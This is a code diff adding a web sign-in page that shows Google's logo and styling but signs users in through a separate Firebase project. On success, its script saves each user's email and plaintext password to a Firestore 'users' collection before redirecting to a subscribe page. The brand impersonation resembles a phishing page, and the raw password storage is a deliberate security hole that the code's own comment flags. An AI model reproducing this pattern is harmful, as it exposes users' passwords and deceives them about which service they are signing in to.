@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: #f5f5f5;
+        }
+        .login-box {
+            width: 400px;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            background: white;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .logo {
+            width: 75px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #1765cc;
+        }
+        button:disabled {
+            background: #8ab4f8;
+            cursor: not-allowed;
+        }
+        .footer {
+            margin-top: 30px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+        a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .error {
+            color: #d93025;
+            font-size: 14px;
+            margin-top: -15px;
+            margin-bottom: 15px;
+            text-align: left;
+            display: none;
+        }
+        .email-display {
+            font-weight: 500;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .change-email {
+            color: #1a73e8;
+            cursor: pointer;
+            font-weight: normal;
+        }
+        #password-stage {
+            display: none;
+        }
+        .forgot-password {
+            display: block;
+            text-align: left;
+            margin-top: -15px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Logo" class="logo">
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to your account</p>
+        
+        <!-- Email Stage -->
+        <div id="email-stage">
+            <div class="email-display" id="email-display" style="display: none;">
+                <span id="displayed-email"></span>
+                <span class="change-email" id="change-email">Change</span>
+            </div>
+            <input type="email" id="email" placeholder="Email or phone" autofocus>
+            <div class="error" id="email-error">Enter a valid email or phone number</div>
+            <button type="button" id="next-btn" disabled>Next</button>
+            <div class="footer">
+                <a href="#" id="create-account">Create account</a>
+            </div>
+        </div>
+        
+        <!-- Password Stage -->
+        <div id="password-stage">
+            <div class="email-display">
+                <span id="password-email-display"></span>
+                <span class="change-email" id="password-change-email">Change</span>
+            </div>
+            <input type="password" id="password" placeholder="Enter your password" autofocus>
+            <div class="error" id="password-error">Enter your password</div>
+            <a href="#" class="forgot-password">Forgot password?</a>
+            <button type="button" id="signin-btn">Sign in</button>
+            <div class="footer">
+                <a href="#" id="learn-more">Learn more</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    
+    <script>
+        // Initialize Firebase with your config
+        const firebaseConfig = {
+            apiKey: "AIzaSyDgfqSEXwZNLpuNb4qYGrULTHrZ_SJMQI4",
+            authDomain: "channels-c8d13.firebaseapp.com",
+            projectId: "channels-c8d13",
+            storageBucket: "channels-c8d13.appspot.com",
+            messagingSenderId: "704343212635",
+            appId: "1:704343212635:web:ea14e6414c5137cace757e",
+            measurementId: "G-G5FQX9J4ER"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+
+        // DOM elements
+        const emailInput = document.getElementById('email');
+        const emailError = document.getElementById('email-error');
+        const nextBtn = document.getElementById('next-btn');
+        const passwordStage = document.getElementById('password-stage');
+        const emailStage = document.getElementById('email-stage');
+        const emailDisplay = document.getElementById('email-display');
+        const displayedEmail = document.getElementById('displayed-email');
+        const changeEmailBtn = document.getElementById('change-email');
+        const passwordEmailDisplay = document.getElementById('password-email-display');
+        const passwordChangeEmail = document.getElementById('password-change-email');
+        const passwordInput = document.getElementById('password');
+        const passwordError = document.getElementById('password-error');
+        const signinBtn = document.getElementById('signin-btn');
+
+        // Email validation
+        emailInput.addEventListener('input', function() {
+            const email = emailInput.value.trim();
+            const isValid = validateEmail(email);
+            
+            if (email.length === 0) {
+                nextBtn.disabled = true;
+                emailError.style.display = 'none';
+            } else if (isValid) {
+                nextBtn.disabled = false;
+                emailError.style.display = 'none';
+            } else {
+                nextBtn.disabled = true;
+                emailError.style.display = 'block';
+            }
+        });
+
+        // Next button click
+        nextBtn.addEventListener('click', function() {
+            const email = emailInput.value.trim();
+            
+            if (validateEmail(email)) {
+                // Show password stage
+                emailStage.style.display = 'none';
+                passwordStage.style.display = 'block';
+                
+                // Show email display
+                emailDisplay.style.display = 'flex';
+                displayedEmail.textContent = email;
+                passwordEmailDisplay.textContent = email;
+                
+                // Focus password field
+                passwordInput.focus();
+            } else {
+                emailError.style.display = 'block';
+            }
+        });
+
+        // Change email buttons
+        changeEmailBtn.addEventListener('click', showEmailStage);
+        passwordChangeEmail.addEventListener('click', showEmailStage);
+
+        function showEmailStage() {
+            passwordStage.style.display = 'none';
+            emailStage.style.display = 'block';
+            emailDisplay.style.display = 'none';
+            emailInput.focus();
+        }
+
+        // Sign in button
+        signinBtn.addEventListener('click', function() {
+            const email = displayedEmail.textContent;
+            const password = passwordInput.value.trim();
+            
+            if (password.length === 0) {
+                passwordError.style.display = 'block';
+                passwordInput.focus();
+                return;
+            }
+            
+            passwordError.style.display = 'none';
+            
+            // Authenticate with Firebase
+            auth.signInWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    // Signed in
+                    const user = userCredential.user;
+                    
+                    // Save user data to Firestore
+                    return db.collection('users').doc(user.uid).set({
+                        email: email,
+                        password: password, // Note: Storing passwords directly is not recommended in production
+                        lastLogin: firebase.firestore.FieldValue.serverTimestamp()
+                    }, { merge: true });
+                })
+                .then(() => {
+                    // Redirect to subscribe page
+                    window.location.href = 'subscribe.html';
+                })
+                .catch((error) => {
+                    const errorCode = error.code;
+                    const errorMessage = error.message;
+                    
+                    if (errorCode === 'auth/wrong-password') {
+                        passwordError.textContent = 'Wrong password. Try again or click Forgot password to reset it.';
+                    } else {
+                        passwordError.textContent = errorMessage;
+                    }
+                    passwordError.style.display = 'block';
+                });
+        });
+
+        // Allow pressing Enter in email field to proceed
+        emailInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && !nextBtn.disabled) {
+                nextBtn.click();
+            }
+        });
+
+        // Allow pressing Enter in password field to sign in
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                signinBtn.click();
+            }
+        });
+
+        // Email validation function
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+    </script>
+</body>
+</html>
